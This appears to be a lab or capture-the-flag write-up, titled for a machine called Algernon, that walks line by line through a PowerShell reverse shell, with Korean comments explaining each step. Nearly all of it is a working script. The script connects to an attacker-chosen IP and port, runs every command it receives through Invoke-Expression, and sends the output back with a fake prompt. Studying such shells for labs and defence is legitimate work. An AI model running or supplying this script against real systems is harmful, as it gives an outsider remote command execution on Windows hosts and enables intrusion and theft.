# PowerShell Reverse Shell (Algernon write-up)

# 0. TCP 클라이언트 생성 및 연결 (IP와 포트는 직접 입력하세요)
$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>)

# 입력 확인
$client

Client              : System.Net.Sockets.Socket
# 지금 바로 읽을 수 있는 수신 버퍼에 들어온 바이트 수
Available           : 0
# TCP 연결 상태 여부
Connected           : True
# 소켓 정보 독점 연결 여부로 클라이언트에서는 크게 상관 X
ExclusiveAddressUse : False
# 수신 버퍼 크기 64KB
ReceiveBufferSize   : 65536
SendBufferSize      : 65536
# 수신 시 무제한 기다림 0
ReceiveTimeout      : 0
SendTimeout         : 0
# 소켓 닫을 시 남은 데이터를 다 보낼지 결정
# linger -> 소켓을 닫을 시, 버퍼에 잔존한 데이터 처리 결정 여부
LingerState         : System.Net.Sockets.LingerOption
# Nagle 알고리즘 사용 여부 -> 트래픽 최적화 알고리즘 -> 어느정도 모아서 보냄
NoDelay             : False

---

# 1. 스트림 연결 (TCP 클라이언트에서 읽기/쓰기용 스트림을 가져옴)
$stream = $client.GetStream()

# 2. 수신용 바이트 버퍼 생성 (64KB 크기, 모두 0으로 초기화)
# 0..65535: 0부터 65535까지의 정수 범위
# % {0}: ForEach-Object 별칭으로 각각 0을 출력 → 0이 65536개 들어있는 배열
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

# 3. 데이터 수신 및 명령 실행 루프
# Stream.Read는 읽은 바이트 수를 반환하며, 더 이상 읽을 데이터가 없으면 0을 반환
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {

    # 3-1. 읽어온 바이트를 문자열로 변환 (ASCII 인코딩)
    # $bytes 배열의 0번 인덱스부터 $i 개만큼만 문자열로 디코딩
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)

    # 3-2. 수신한 문자열을 PowerShell 명령어로 실행 (iex = Invoke-Expression)
    # 2>&1: 표준 에러 출력을 표준 출력으로 합침 (에러 메시지도 결과에 포함)
    # Out-String: 실행 결과를 단일 문자열로 변환
    $sendback = (iex $data 2>&1 | Out-String)

    # 3-3. 결과 뒤에 가짜 PowerShell 프롬프트 문자열 붙이기
    # 예: "PS C:\Users\Admin> "
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "

    # 3-4. 보낼 문자열을 바이트 배열로 변환 (ASCII 인코딩)
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)

    # 3-5. 네트워크 스트림으로 결과 전송
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# 4. 연결 종료 후 소켓 닫기
$client.Close()
